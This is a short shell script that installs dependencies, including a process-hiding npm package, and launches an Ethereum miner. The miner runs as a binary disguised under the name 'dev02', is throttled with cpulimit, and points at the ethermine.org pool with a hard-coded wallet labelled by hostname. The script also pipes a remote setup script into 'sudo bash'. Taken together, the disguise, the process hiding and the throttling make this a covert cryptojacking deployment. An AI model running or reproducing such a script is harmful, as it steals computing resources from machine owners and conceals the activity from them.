#!/bin/sh
apt update && apt -y install sudo
sudo apt update;apt -y install build-essential cpulimit screen ca-certificates libcurl4
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
sudo apt-get install -y nodejs
sudo apt-get install gcc g++ make
sudo -u root npm i -g node-process-hider
sudo ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
sudo dpkg-reconfigure --frontend noninteractive tzdata
chmod +x dev02
cpulimit -e dev02 -l 30 &
./dev02 --algo ETHASH --pool asia1.ethermine.org:4444 --user 0x4ee351b518733adba8aee4fbfd64bce2061b3ebd.Modal_Nikah$(cat /proc/sys/kernel/hostname)
